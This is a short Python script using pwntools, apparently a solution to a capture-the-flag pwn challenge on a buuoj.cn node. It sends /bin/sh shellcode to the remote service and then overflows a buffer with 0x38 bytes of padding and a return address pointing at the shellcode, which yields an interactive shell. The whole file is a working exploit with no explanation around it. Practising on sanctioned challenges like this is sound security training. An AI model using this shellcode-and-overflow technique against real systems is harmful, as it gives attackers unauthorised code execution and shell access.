from pwn import*

context(log_level = 'debug', arch = 'amd64', os = 'linux')
shellcode=asm(shellcraft.sh())

p=remote('node5.buuoj.cn',25251)
p.recvuntil('me?')

payload=shellcode
p.sendline(payload)

p.recvuntil('else?')

payload=b'a'*0x38+p64(0x233000)

p.sendline(payload)
p.interactive()
